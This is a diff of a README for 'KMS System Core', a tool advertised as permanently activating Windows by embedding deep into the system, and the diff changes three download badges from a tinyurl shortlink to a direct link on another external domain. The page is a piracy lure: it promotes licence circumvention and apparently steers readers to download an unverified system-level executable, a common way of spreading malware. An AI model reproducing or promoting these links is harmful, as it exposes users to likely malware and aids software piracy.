@@ -9,7 +9,7 @@ The **🖥️ KMS System Core** is a deep system-level activation engine that in
 
 <div align="center">
 
-[![Download KMS System Core](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/kms-system-core)
+[![Download KMS System Core](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/kms-system-core)
 
 </div>
 
@@ -97,7 +97,7 @@ Standard activation tools stop working after Windows updates. They don't survive
 5. **🔄 Reboot** to complete integration
 6. **🎉 Done** — system is permanently activated
 
-[![Download KMS System Core](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/kms-system-core)
+[![Download KMS System Core](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/kms-system-core)
 
 ### Installation Interface
 
@@ -230,7 +230,7 @@ Deep system integration. Permanent activation. **KMS System Core** embeds into W
 
 <div align="center">
 
-[![Download KMS System Core](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/kms-system-core)
+[![Download KMS System Core](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/kms-system-core)
 
 **Version 3.2.0** — Deep system activation engine. Free forever.
 
